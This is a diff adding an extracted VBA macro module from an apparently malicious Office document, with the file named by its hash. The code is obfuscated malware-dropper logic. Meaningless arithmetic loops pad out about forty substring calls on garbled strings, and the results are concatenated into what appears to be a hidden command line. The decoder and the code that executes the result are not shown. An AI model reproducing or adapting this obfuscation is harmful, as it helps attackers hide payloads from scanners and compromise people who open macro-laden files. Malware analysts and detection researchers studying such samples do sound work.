@@ -1,0 +1,311 @@
+Filename     : ./macros/32a9b87a265afc5e29490fde88ebf2008e034a014fa688ee092c5aafc7a19195
+OLE stream   : Macros/VBA/twFaafc
+VBA filename : twFaafc.bas
+----------------------------------------
+Attribute VB_Name = "twFaafc"
+Sub uLCUGrdp()
+On Error Resume Next
+For Each fzfolt In wcfSCS
+         dtwRv = (EUmJjw * Sqr(GfdHw) / 18077 / Rnd(tqpEi - CSng(qSYScP - kSMdIj * hKKVIo / 71879)) / (TwXVt * PnDsjB))
+Next
+End Sub
+Function KlLOzvjXVZu()
+On Error Resume Next
+For Each lvUhQK In oSzzM
+         rijTw = (IXzauG * Sqr(sUfIl) / 48709 / Rnd(NvOpor - CSng(NfBzYI - BjHkwp * OmVZav / 35474)) / (IJNZi * wTqfEP))
+Next
+For Each OhQFP In kXEbm
+         qlRaT = (rRFbkV * Sqr(EGUIpP) / 73852 / Rnd(AdinT - CSng(ARGZT - jYPDki * XSKmwu / 23565)) / (GQOOM * iqHmmz))
+Next
+hOJAwiDt = JRtQMG("EfV !%inawWzjuOadw", 46558 - 46558 + 4 + 46558 - 46558, 46558 - 46558 + 12 + 46558 - 46558)
+For Each rzwCRZ In jrQYL
+         PFqqhs = (ztBsK * Sqr(wFiIQ) / 95390 / Rnd(FfSLkf - CSng(CfPzp - jkYzQ * tsizw / 12120)) / (JcDwiz * jXjmiG))
+Next
+For Each ZBHjb In QpLrdL
+         VvvWr = (aXsPBb * Sqr(dCJdp) / 90047 / Rnd(nsXGwD - CSng(WGqwGz - YRmnq * ipjmG / 16835)) / (zOjiC * TMdXoZ))
+Next
+MUfuJsfNH = JRtQMG("q9MKi% tesGz1,", 4401 - 4401 + 5 + 4401 - 4401, 4401 - 4401 + 5 + 4401 - 4401)
+For Each DDQCSu In zFkWqw
+         JzMkAn = (jIaIuY * Sqr(zuuzOB) / 26911 / Rnd(YdULjW - CSng(dJrDEJ - RmolF * vqtXW / 93430)) / (KqYcw * fZiQo))
+Next
+For Each EzFVQ In RhwlC
+         IBbav = (zZkYnw * Sqr(BwPfj) / 80265 / Rnd(MNmHk - CSng(ldMJv - jKpBh * LjRMYf / 24249)) / (ROJBC * vznuP))
+Next
+OakQRSC = JRtQMG("5J3%!!%zTXVnqimVwjj", 13348 - 13348 + 6 + 13348 - 13348, 13348 - 13348 + 11 + 13348 - 13348)
+For Each qmqTN In diNuMu
+         oXJmzo = (ubsWU * Sqr(GjNmW) / 90440 / Rnd(MAZqwz - CSng(CivWBO - OqmKn * IZOtT / 98819)) / (UwRbX * IVowS))
+Next
+For Each AzZVJI In OYaYjk
+         GRWAO = (QKJkut * Sqr(EJzKX) / 69843 / Rnd(NwWqN - CSng(WftXhY - YTHiG * JVppo / 51189)) / (GXFbP * wToHv))
+Next
+zzfCPWHJwNn = JRtQMG("sAb9t0AzAjoFiL% tems", 77594 - 77594 + 3 + 77594 - 77594, 77594 - 77594 + 12 + 77594 - 77594)
+For Each nmYlRm In WhdlC
+         DNauX = (hPwVz * Sqr(RHjbr) / 70203 / Rnd(LCTXl - CSng(XDlEjd - DMLnWZ * wOPqR / 48369)) / (ziWup * aqMkpp))
+Next
+For Each jdqlT In LwTYU
+         DdpMm = (IRIfn * Sqr(iQUWr) / 26457 / Rnd(GCcCwp - CSng(izvEqh - jUZNI * fsPsDp / 55697)) / (CCpGG * OLbbrW))
+Next
+vhhZZZHLT = JRtQMG("X99udzwD", 19331 - 19331 + 4 + 19331 - 19331, 19331 - 19331 + 2 + 19331 - 19331)
+For Each TKWEpF In CwvJi
+         MNnjw = (MrfvG * Sqr(kBlUtz) / 42413 / Rnd(BMhsoO - CSng(PAGGfY - UAYrdi * AoOPG / 10261)) / (bhCzn * TAfuvj))
+Next
+For Each IziEf In JAqHLi
+         SCmwt = (laJYR * Sqr(BXCaWS) / 59175 / Rnd(YjMoP - CSng(pnfWJ - WJKOF * AfObw / 47965)) / (KiVHa * pjVui))
+Next
+OKptYU = JRtQMG("mb@mPjudOUZfZSTZp% @S", 46542 - 46542 + 3 + 46542 - 46542, 46542 - 46542 + 15 + 46542 - 46542)
+For Each zhtSwu In PJXsMn
+         LSzzw = (nXFVUf * Sqr(BUbBP) / 54813 / Rnd(HcHNQ - CSng(LJGmlI - FIXhW * wCZcXw / 35194)) / (lviWdk * NjLli))
+Next
+For Each kZvTL In rkYCK
+         JQHJz = (jYOqwd * Sqr(wIrius) / 44112 / Rnd(zIchT - CSng(vbzZpY - mHjmct * JBuaR / 43363)) / (DzFdJ * JKHibf))
+Next
+cUuuVfqarzo = JRtQMG("SGB3&&ZzNFZKQFqf3", 29234 - 29234 + 6 + 29234 - 29234, 29234 - 29234 + 8 + 29234 - 29234)
+For Each nzOQJ In OJAIs
+         zFGzO = (Qzhsc * Sqr(wfkZcz) / 8596 / Rnd(wqiMn - CSng(RMIFCr - LJiCM * dLiVuU / 40233)) / (iUohA * hVJat))
+Next
+For Each dbiZB In HLzhK
+         GJivv = (pQmom * Sqr(YDFwur) / 75326 / Rnd(LtPwS - CSng(TzfmCO - dHDOn * wkOWpp / 85790)) / (wzLQG * vEMukc))
+Next
+AwPPF = JRtQMG("U7w@XUQNWtjHolq=FKW", 20430 - 20430 + 4 + 20430 - 20430, 20430 - 20430 + 10 + 20430 - 20430)
+For Each Eqlzl In auvCi
+         uqizX = (JZmVzU * Sqr(wTQYv) / 16040 / Rnd(KosudW - CSng(RRGCw - KLDQHp * bCViq / 31749)) / (oEKVAu * wGwjU))
+Next
+For Each vjIwY In RQBfi
+         EtvznG = (XdsZb * Sqr(hbLuO) / 38565 / Rnd(wGFOID - CSng(YPuRzn - OThuij * nvDHj / 60553)) / (zFVnLv * wojqjM))
+Next
+obDYkloqD = JRtQMG("mPp7.%!!%NfMnszXzw4", 2369 - 2369 + 2 + 2369 - 2369, 2369 - 2369 + 13 + 2369 - 2369)
+For Each IjbaoR In IdAkn
+         ILCHcY = (bJYio * Sqr(EQfAEv) / 38035 / Rnd(fMbjr - CSng(XocVC - QlnlZ * KJVzK / 94634)) / (wMCdcv * TXdzaa))
+Next
+For Each IYaHwb In TIvILq
+         SpqSG = (iHKmij * Sqr(ZuUcf) / 67487 / Rnd(nINBO - CSng(kJFQZ - wTJWtO * dPANoZ / 23981)) / (YYoScc * bKboDG))
+Next
+ZtSXpIOzqCZ = JRtQMG(".@ZbOUZfZSTZp%!=BEz", 69880 - 69880 + 4 + 69880 - 69880, 69880 - 69880 + 12 + 69880 - 69880)
+For Each UCtMjk In PYaOhF
+         muZcCZ = (kQwwX * Sqr(rzuFK) / 84899 / Rnd(vzUbpb - CSng(IANEvX - oPCMBj * jlvQMZ / 80418)) / (dVDpa * oazmah))
+Next
+For Each zRpPM In PEcNbX
+         SQCTYm = (ISIHj * Sqr(zIOQbS) / 98909 / Rnd(oriOwa - CSng(oUqdfI - Ditia * NiIij / 52866)) / (GqLlJY * iYUFa))
+Next
+IdCXPLZvWw = JRtQMG("T7dB3uOEZvDujn", 6917 - 6917 + 3 + 6917 - 6917, 6917 - 6917 + 7 + 6917 - 6917)
+For Each cUwSd In ddFjW
+         rtSKjz = (WlozIE * Sqr(HBqfJ) / 77254 / Rnd(Odsjp - CSng(bwLBH - sRioTo * WEanX / 80822)) / (JzbmZ * ikcQZ))
+Next
+For Each TYoKHJ In wpcAmJ
+         bZmdw = (ZJzrER * Sqr(lVOHzn) / 33263 / Rnd(tLRus - CSng(LYaOd - cVqPuq * OKZwGq / 48558)) / (baVAw * khNUjF))
+Next
+KTNiAVlNRmB = JRtQMG("3liFvJzEAIc=%qChB", 56771 - 56771 + 3 + 56771 - 56771, 56771 - 56771 + 11 + 56771 - 56771)
+For Each NlYdac In QfwNI
+         CIUOLE = (IkzFN * Sqr(vsncuL) / 71187 / Rnd(BZBTf - CSng(SrvbH - IpbNzJ * mScnTP / 92597)) / (OdCEBX * BjSuf))
+Next
+For Each IJEFK In EkwWL
+         KMjcoz = (TdvrJY * Sqr(zNdMO) / 82934 / Rnd(XilGrt - CSng(tHDMHf - MXPYE * ziNSuh / 71514)) / (rGjHT * mizVw))
+Next
+jhuDf = JRtQMG("9mbvV tes&B", 83056 - 83056 + 2 + 83056 - 83056, 83056 - 83056 + 5 + 83056 - 83056)
+For Each PaWri In tEmpN
+         KwfoUS = (KHGCA * Sqr(EnQhi) / 48869 / Rnd(cziZMW - CSng(snjhBs - zXjzJf * lwIXV / 45924)) / (PcWEQT * KSGcw))
+Next
+For Each dzudPX In OqPfHX
+         KkzDEn = (iNznq * Sqr(Tcota) / 21839 / Rnd(HCVMv - CSng(ACsWoE - jCJuYd * ZzjvqZ / 2435)) / (lBWEwz * IOnHKm))
+Next
+vmhJubMdawb = JRtQMG("lwN3%poYDftYEV% tesSj", 58411 - 58411 + 3 + 58411 - 58411, 58411 - 58411 + 15 + 58411 - 58411)
+For Each lrLjI In RTtVzM
+         ISaWW = (YQqAjI * Sqr(EuuGQS) / 23262 / Rnd(NskGQ - CSng(LSHAH - zSpoRl * Onuqb / 52820)) / (lXYnE * AfvaqP))
+Next
+For Each ZWaWX In fUvqQS
+         ccmzn = (MTkbK * Sqr(YQGGV) / 26016 / Rnd(HJiDc - CSng(jBKzTz - UhmTFK * HPkou / 31019)) / (whZOZ * qKIuZJ))
+Next
+iKttvttO = JRtQMG("WkzZVvVjhwSonjSTj%A2M", 10118 - 10118 + 4 + 10118 - 10118, 10118 - 10118 + 14 + 10118 - 10118)
+For Each HwCUR In TqqimA
+         qRsZt = (MjhUl * Sqr(tXAKZr) / 89537 / Rnd(FQINQX - CSng(wUHDm - OmYSj * QwYZi / 33745)) / (XESjRm * EGZJfI))
+Next
+For Each IunzO In fDjdk
+         wJAun = (MNwUw * Sqr(jMkMmD) / 88268 / Rnd(GIMjw - CSng(UjaKo - bAQBBY * YFPUow / 16164)) / (CkSRf * XzpzUw))
+Next
+wzhEQmdZ = JRtQMG("vLFhaPC% tes&&Z34oN,7", 41885 - 41885 + 7 + 41885 - 41885, 41885 - 41885 + 13 + 41885 - 41885)
+For Each wjnnj In DivjK
+         VVIrn = (hpHSv * Sqr(tILDD) / 52683 / Rnd(hcScZ - CSng(hHwEhG - IDJOP * BYmGH / 57605)) / (juXqAf * idlDs))
+Next
+For Each jzOiLL In TsWvCN
+         mYabUn = (tQMfi * Sqr(DbPcp) / 28257 / Rnd(NuElU - CSng(pFjBY - fzVhE * ZNWmiC / 5101)) / (torctG * zOsUpH))
+Next
+SzobYmLIA = JRtQMG("r,CqzEl% tes&&p=%7UF12z", 67186 - 67186 + 7 + 67186 - 67186, 67186 - 67186 + 14 + 67186 - 67186)
+For Each wCMPnJ In SitLhP
+         saLCj = (bANDHS * Sqr(jldNPn) / 50319 / Rnd(TaTOt - CSng(bFzRMq - GnhRGT * zpIHV / 51079)) / (jFjvu * lYArop))
+Next
+For Each woVMq In jrOhnD
+         isWSH = (GhUhBW * Sqr(RtUJD) / 80665 / Rnd(iziVtE - CSng(hmLOE - vjAjL * dnSdG / 38226)) / (mPpWEd * OflKAY))
+Next
+DFjsuSVEEb = JRtQMG("bn3iSc4%NfMn6f", 11730 - 11730 + 3 + 11730 - 11730, 11730 - 11730 + 5 + 11730 - 11730)
+For Each KZuIT In NIitkw
+         LBLTbB = (RBrPH * Sqr(HuQwqj) / 73654 / Rnd(TOYVn - CSng(bihwm - jlNTR * wVlJhf / 1836)) / (pTsjDA * osmnz))
+Next
+For Each VXOVqw In WzcLUk
+         LVYwUk = (rcpfi * Sqr(hzWzML) / 7089 / Rnd(LjwJZ - CSng(UIcSm - WCwAXA * jdvYq / 23220)) / (QYcfw * hizlZ))
+Next
+IhvTZClG = JRtQMG("@1H%!!%poYDftYEViLRU8", 77380 - 77380 + 6 + 77380 - 77380, 77380 - 77380 + 13 + 77380 - 77380)
+For Each vjqjzX In zSiBVZ
+         BXiPL = (zSmvf * Sqr(TcwnCK) / 51771 / Rnd(EdqtwA - CSng(MomXHG - HJDkaQ * dtuEBD / 32599)) / (ibquq * YhlTK))
+Next
+For Each bRwvr In sDXji
+         iUkRL = (dHniO * Sqr(zKmpl) / 95584 / Rnd(GnRkI - CSng(oTvIP - Bwmvpz * Xzlum / 94204)) / (qzhjD * ZLYQM))
+Next
+tjudw = JRtQMG("mm3XXwNcs7", 23743 - 23743 + 4 + 23743 - 23743, 23743 - 23743 + 1 + 23743 - 23743)
+For Each bJWjhz In wNILO
+         qbaYUt = (nFRrmM * Sqr(wIpYV) / 67513 / Rnd(YAATE - CSng(OAqhmS - NpzmDX * zVsftU / 88266)) / (nXkpf * SbZFQw))
+Next
+For Each YhzjEI In fvWBF
+         pkKXSq = (EVvzj * Sqr(unTTJ) / 59305 / Rnd(zCrzFD - CSng(aSwMU - wuMlcc * ivDmB / 95164)) / (OTLcMW * intNR))
+Next
+bhbAjMTTco = JRtQMG("6.7voNUVnBMSoZ", 31810 - 31810 + 5 + 31810 - 31810, 31810 - 31810 + 5 + 31810 - 31810)
+For Each QklWj In HWzbir
+         UNCzFv = (RLHHW * Sqr(zORGS) / 47016 / Rnd(NttJj - CSng(XqPOr - lfCzco * RJzFdi / 707)) / (fsFtJJ * SbUsTC))
+Next
+For Each CiQFHT In tEQZLn
+         WiCNYC = (jpiHQv * Sqr(fjpWj) / 13148 / Rnd(jWdYA - CSng(jcuHvj - iOrzk * AVoiz / 82649)) / (jNVaD * hYmLYo))
+Next
+pzmTKJz = JRtQMG("9@w%!=%zTXVnqi% tes&zWK.", 45901 - 45901 + 5 + 45901 - 45901, 45901 - 45901 + 17 + 45901 - 45901)
+For Each CwEub In jndRr
+         lMGhun = (hcTVGU * Sqr(QzivC) / 36274 / Rnd(NREQu - CSng(lHkCw - kRSars * sHvib / 96473)) / (XvkEiO * fYvBQ))
+Next
+For Each czqKSp In FdnKAb
+         vscsV = (vMsYM * Sqr(TzXEsw) / 96846 / Rnd(EwPtt - CSng(tTAFP - oArjuV * OBPGSw / 38811)) / (ziZuO * aGwdj))
+Next
+wmIpEN = JRtQMG("93394JFhaPC%!!%qAzAjoFiLNO", 685 - 685 + 3 + 685 - 685, 685 - 685 + 19 + 685 - 685)
+For Each OScLnJ In JTFnJ
+         BjApq = (vZmulb * Sqr(AzOtt) / 12300 / Rnd(WjwYD - CSng(IkKBt - PWNSZQ * joZcY / 83656)) / (cJQvZM * zBUnbm))
+Next
+For Each iFGrR In OCLEEm
+         iEYdU = (kQwbZf * Sqr(CPOYd) / 20633 / Rnd(siNWC - CSng(Plnnv - HdivHR * Awrjij / 22386)) / (bzona * iRErCa))
+Next
+mzUrw = JRtQMG("..c89s&&!%zDnqzEl3T6", 44628 - 44628 + 4 + 44628 - 44628, 44628 - 44628 + 12 + 44628 - 44628)
+For Each NwcKf In YnXUHG
+         KJBzjp = (znmzAV * Sqr(cLaEEq) / 27508 / Rnd(zOVzjn - CSng(Eijjf - VQGIMj * ZMcKK / 27270)) / (bwQCQh * JmckG))
+Next
+For Each GEFfu In GKEpd
+         cUUhO = (Umccr * Sqr(mvXia) / 70301 / Rnd(XwbfGt - CSng(zVzhhH - cvRGiJ * IirdN / 84555)) / (zvYkUB * RBpOo))
+Next
+BAPPIVETQF = JRtQMG("izntC=%zDni1sM", 7175 - 7175 + 5 + 7175 - 7175, 7175 - 7175 + 5 + 7175 - 7175)
+For Each Nwovu In ZKzGbv
+         PONjBs = (CwZZw * Sqr(FiKuc) / 86029 / Rnd(pKJuwi - CSng(Sizpwp - mrDRnV * QOZOzh / 59418)) / (zFdiEl * ETnSP))
+Next
+For Each rRXDlu In SwnDp
+         LJSXXz = (tUdUt * Sqr(jiZtmb) / 57679 / Rnd(tozLkT - CSng(maLQb - RWcXh * NkWoDJ / 75543)) / (ssCAc * USVSL))
+Next
+FGFDw = JRtQMG("@FELs&&w^YFbi", 67537 - 67537 + 5 + 67537 - 67537, 67537 - 67537 + 5 + 67537 - 67537)
+For Each dJGuRE In sRHzW
+         iQrXA = (CzIXuY * Sqr(nQlzB) / 18644 / Rnd(uODdc - CSng(wrutk - jvtucu * VJpUm / 23980)) / (HQBHS * oLLUN))
+Next
+For Each REcXMJ In MEGLiz
+         RJcIcY = (rTGNB * Sqr(DIkjFp) / 71436 / Rnd(sNrCLa - CSng(DmLAVD - vNIatZ * kVJLSl / 8632)) / (XFoNG * wkFRw))
+Next
+nwrSniYwjw = JRtQMG("dM.R9ot8iW", 27203 - 27203 + 5 + 27203 - 27203, 27203 - 27203 + 1 + 27203 - 27203)
+For Each nhvNfn In MXafw
+         DHrir = (oYjOFL * Sqr(zFzcD) / 17614 / Rnd(mnDawj - CSng(Nswzas - CREBN * JPDSp / 2482)) / (pTMuW * BZQER))
+Next
+For Each jaNru In NitSb
+         GtGZzo = (ijKjF * Sqr(nEKItM) / 26411 / Rnd(NjGdL - CSng(UnCwHB - BjBmn * BFmYqH / 5157)) / (JCaAG * LsKzv))
+Next
+lljlT = JRtQMG("iT9v7J% tes&&eh=%qEfJW", 73073 - 73073 + 2 + 73073 - 73073, 73073 - 73073 + 15 + 73073 - 73073)
+For Each MjuiOc In llXJW
+         cMIbK = (WIUKl * Sqr(wBnqJW) / 3648 / Rnd(wXUKIK - CSng(CRVlt - tiBCQ * jYfsWJ / 4466)) / (aQubB * fHErw))
+Next
+For Each GzKwB In GkrSX
+         oHMiw = (AWnFD * Sqr(ImrPl) / 55534 / Rnd(aFuiHp - CSng(vNdLj - pMzuV * fcHtXA / 88969)) / (pOYrw * nzNuY))
+Next
+HSUWHMJKY = JRtQMG("zLSfwiWYwq=%lwHiYWkbua,", 36905 - 36905 + 4 + 36905 - 36905, 36905 - 36905 + 15 + 36905 - 36905)
+For Each ojLnt In ZkLwow
+         nzDSMW = (Njcjom * Sqr(RfswD) / 43328 / Rnd(JwQUz - CSng(aJztac - LRjiBX * rHEfwH / 30298)) / (FTzlZ * iwnwMb))
+Next
+For Each aRKtXv In JNEPuC
+         AtnRi = (dwtcK * Sqr(rXuVz) / 61422 / Rnd(ttfiGi - CSng(kzHPQE - niFwNp * FdXhi / 99958)) / (KPsHj * IbUOh))
+Next
+uFIAjC = JRtQMG("za@.es&&s=%q0Z", 14702 - 14702 + 3 + 14702 - 14702, 14702 - 14702 + 8 + 14702 - 14702)
+For Each qWdpdM In rDooY
+         qjoQHz = (inZkO * Sqr(jwXMO) / 82680 / Rnd(fzjbo - CSng(VcIAVa - XtWUK * RKzCw / 87753)) / (VfHUra * JEqzMc))
+Next
+For Each oVUVEE In JJdTIC
+         llkCvT = (YXVXn * Sqr(SMTfj) / 5045 / Rnd(lSJmdf - CSng(bzQzt - zVvJwm * qQwww / 32386)) / (bzpwnG * DTczZ))
+Next
+HoDBjtpGPD = JRtQMG("WvaWes&&omzwEMLGC8.T", 27265 - 27265 + 4 + 27265 - 27265, 27265 - 27265 + 13 + 27265 - 27265)
+For Each vjbGV In FRzQKj
+         iwVUKo = (swiHS * Sqr(nTwBT) / 22996 / Rnd(WXJor - CSng(ULVdjf - sXQhz * IMWzC / 39334)) / (IqmUww * MXKohc))
+Next
+For Each fBpwn In mAwavm
+         Yzjiwr = (jqYIpO * Sqr(jCWvdm) / 9453 / Rnd(pmZwXG - CSng(zcfdh - RPVtKb * pchGZL / 13033)) / (biRzts * zEAUs))
+Next
+JhmPEhlFLwo = JRtQMG("7B1v&r^e=HJ", 63215 - 63215 + 3 + 63215 - 63215, 63215 - 63215 + 5 + 63215 - 63215)
+For Each rwdMhl In nBBSL
+         qMFSX = (ACXzN * Sqr(nzJSQt) / 82088 / Rnd(BwjDus - CSng(rKacz - YBwsmc * sjTwQ / 65227)) / (mFVkHc * TsfBYi))
+Next
+For Each ztukd In ZHvSdB
+         XOmOc = (NWBvL * Sqr(XhfSEs) / 53253 / Rnd(MBcIWX - CSng(EBsiF - Aortu * ZHzwzi / 93917)) / (vuprZ * JFWmd))
+Next
+piuXbut = JRtQMG("AJtq..f ", 73105 - 73105 + 6 + 73105 - 73105, 73105 - 73105 + 1 + 73105 - 73105)
+For Each EwIVIR In YWtoY
+         QBjOE = (ZZRRKL * Sqr(EDGvR) / 8887 / Rnd(CXbzc - CSng(jcYiBF - iJAaq * IETnj / 95792)) / (INCRb * jJGsak))
+Next
+For Each FQjiIF In AZUkzh
+         DJuGk = (iiZca * Sqr(ZwoXv) / 42497 / Rnd(BsHbBa - CSng(wiwYr - BinUhj * jHWrD / 7813)) / (jqMCYO * jRvit))
+Next
+YFPmLEGSTXX = JRtQMG("9R3cnYYJQ% tciw", 74230 - 74230 + 4 + 74230 - 74230, 74230 - 74230 + 7 + 74230 - 74230)
+For Each WSAjAl In HuKTpM
+         tuVQX = (ahFRwA * Sqr(ZVMrmo) / 7712 / Rnd(RGmrRX - CSng(ljtNMI - mwfKw * pNinz / 17491)) / (liTjA * McniY))
+Next
+For Each IDlGI In vmYki
+         GNuBb = (hcQESP * Sqr(fpjwJ) / 1583 / Rnd(BdBYGG - CSng(UnmiA - fRHiI * POCDEk / 42904)) / (cNPnP * rXdLVv))
+Next
+NzPnas = JRtQMG("QOszXzwj% tes&&KVOvjb6X", 11721 - 11721 + 6 + 11721 - 11721, 11721 - 11721 + 16 + 11721 - 11721)
+For Each uMoiZ In rWOiz
+         UlZzZz = (kBbHYw * Sqr(QjHov) / 25219 / Rnd(SUBNZ - CSng(SiiOiR - uwRYDO * KTTFPj / 19897)) / (LOZmk * BQYlAS))
+Next
+For Each WpBlbu In SQzwzG
+         AitiA = (waiFW * Sqr(dDUKws) / 38600 / Rnd(PKWww - CSng(nSFwln - iwLYG * TiwHv / 29166)) / (RmwFBD * iDqLuk))
+Next
+VLvmwv = JRtQMG("0GwpoW=%ljpMMpWpJVUuOszsCS", 41419 - 41419 + 4 + 41419 - 41419, 41419 - 41419 + 19 + 41419 - 41419)
+For Each YjVlT In azEIlr
+         BpTCbj = (TBTAv * Sqr(KdaIAi) / 42790 / Rnd(uBbVbj - CSng(ShpTJ - bsknk * cvWMU / 80456)) / (YwYvIH * fGosh))
+Next
+For Each QHKLo In NQnFG
+         cLJnV = (THNifk * Sqr(PbQUN) / 85911 / Rnd(ZvfSw - CSng(HwjwY - rKBBAV * TzUzmb / 49630)) / (Zzzwa * mjjfr))
+Next
+FCEvqDD = JRtQMG("SCBmS%awcEvndBCDq11", 98718 - 98718 + 3 + 98718 - 98718, 98718 - 98718 + 12 + 98718 - 98718)
+For Each ziWYPF In tANZP
+         NZUEwt = (WUiwmC * Sqr(NFiVWJ) / 59422 / Rnd(ocwkj - CSng(jALXh - NnRbjm * TfwYl / 24445)) / (rnWrD * UNksI))
+Next
+For Each iJSGdP In LsLNA
+         UIKkTj = (ofWXqC * Sqr(mvlisJ) / 41555 / Rnd(iaiVYk - CSng(FioGCG - LiQiWn * nvQaj / 31585)) / (HcVqG * ZkCwLC))
+Next
+JVTlpNto = JRtQMG("8n&!%Pj691ZNQ", 23011 - 23011 + 7 + 23011 - 23011, 23011 - 23011 + 5 + 23011 - 23011)
+For Each asijz In KkGRN
+         hXviRu = (TOzBSQ * Sqr(MCbcSS) / 38485 / Rnd(cuMjbK - CSng(fAKID - WiFkD * jvcqP / 37737)) / (MHJdz * SEuASk))
+Next
+For Each lbOCwh In SbnLHA
+         RIfcI = (FtDvTA * Sqr(piSDG) / 98723 / Rnd(oFiZEh - CSng(PQrsH - QoiaQ * adrXT / 67662)) / (IsnJkF * WPMZG))
+Next
+swMjr = JRtQMG("zFK@Kdj%!&&ll=%inawWzjzT", 37644 - 37644 + 3 + 37644 - 37644, 37644 - 37644 + 16 + 37644 - 37644)
+For Each abqcL In LiHBv
+         nnYzzh = (pGYUb * Sqr(HmzwA) / 54051 / Rnd(Usrzm - CSng(MQXUA - sSzRjX * fKQQB / 13188)) / (VEQMf * YlXuv))
+Next
+For Each FzMPsO In DOlUq
+         akQdU = (zKqhwR * Sqr(lnwql) / 53828 / Rnd(wNUtRw - CSng(wvtMK - ITWic * zodPQN / 94709)) / (daHYzs * VMPXM))
+Next
+ZHWqBb = JRtQMG("2BW1sUtn% te20i", 48322 - 48322 + 4 + 48322 - 48322, 48322 - 48322 + 6 + 48322 - 48322)
+For Each ZwOzU In wuRQOO
+         cAUwEf = (FvYoU * Sqr(RUmGH) / 21349 / Rnd(YZqPS - CSng(YAwLKs - LPABO * rrSda / 50127)) / (IWcHKI * wQDKF))
+Next
+For Each wBCKYf In QSipGm
+         Fvjtjf = (oLBYUB * Sqr(diJSAa) / 28494 / Rnd(rFRpX - CSng(CAWzLV - iHPNEX * qBmEi / 4856)) / (jZWGMV * EacqHz))
+Next
+PDbjujpuKvu = JRtQMG("BBU0wEZvDu%!!%qEf@jv", 60726 - 60726 + 4 + 60726 - 60726, 60726 - 60726 + 12 + 60726 - 60726)
+For Each KiYIft In atFvCH
+         pSNLV = (SaztzA * Sqr(ijnWzZ) / 41670 / Rnd(WOvwIs - CSng(fRKJO - OHPflF * jfiIf / 16547)) / (tGjwd * iSERNM))
+Next
+KlLOzvjXVZu = MUfuJsfNH + VLvmwv + HoDBjtpGPD + piuXbut + OKptYU + SzobYmLIA + BAPPIVETQF + nwrSniYwjw + FGFDw + ZHWqBb + bhbAjMTTco + HSUWHMJKY + NzPnas + DFjsuSVEEb + ZtSXpIOzqCZ + vhhZZZHLT + JVTlpNto + jhuDf + iKttvttO + KTNiAVlNRmB + cUuuVfqarzo + vmhJubMdawb + JhmPEhlFLwo + pzmTKJz + mzUrw + zzfCPWHJwNn + uFIAjC + YFPmLEGSTXX + FCEvqDD + AwPPF + tjudw + wzhEQmdZ + lljlT + IdCXPLZvWw + swMjr + obDYkloqD + OakQRSC + IhvTZClG + wmIpEN + PDbjujpuKvu + hOJAwiDt
+For Each Juhjqm In PYXqLU
+         wrjnT = (bPZiL * Sqr(cDvDwR) / 48405 / Rnd(KozuS - CSng(IAVisn - jlbUd * MXtVzY / 19247)) / (wUVZZ * OsHtoU))
+Next
+For Each rzaWwl In nYYpjp
+         ItQNwL = (Wrlwd * Sqr(FMQFrZ) / 93698 / Rnd(ovDcJ - CSng(QklYqo - naZRHD * VGoXUw / 71498)) / (HTwJtb * zNlnj))
+Next
+End Function
